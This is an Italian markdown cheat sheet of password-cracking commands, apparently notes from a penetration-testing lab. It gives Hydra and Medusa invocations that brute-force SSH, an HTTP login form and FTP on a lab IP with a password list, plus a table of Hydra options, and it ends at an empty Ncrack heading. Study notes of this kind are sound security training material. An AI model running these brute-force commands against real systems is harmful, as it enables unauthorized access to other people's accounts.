#Password cracking
## Hydra e Medusa

| Obiettivo | Comando | Note |
|---|---|---|
| SSH utente singolo + password list | `hydra -l musa -P /home/kali/Downloads/password.lst ssh://172.16.4.16` | esempio lab |
| HTTP POST form | `hydra -l fatima -P /home/kali/Downloads/password.lst 172.16.4.16 http-post-form "/path/al/form:username=^USER^&password=^PASS^:Login errata"` | il terzo campo è il messaggio di fallimento |
| FTP con Medusa | `medusa -h 172.16.4.16 -u hassan -P /home/kali/Downloads/password.lst -M ftp` | modulo FTP |

## Opzioni Hydra

| Opzione | Uso |
|---|---|
| `-l` | utente singolo |
| `-L` | file utenti |
| `-p` | password singola |
| `-P` | file password |
| `-C` | file `login:password` |
| `-M` | file host per attacco parallelo |
| `-f` | interrompe al primo match |
| `-R` | riprende sessione `.restore` |

**Tag ricerca:** `hydra`, `medusa`, `password attack`, `bruteforce`, `ssh`, `ftp`, `http-post-form`.

---

## Ncrack
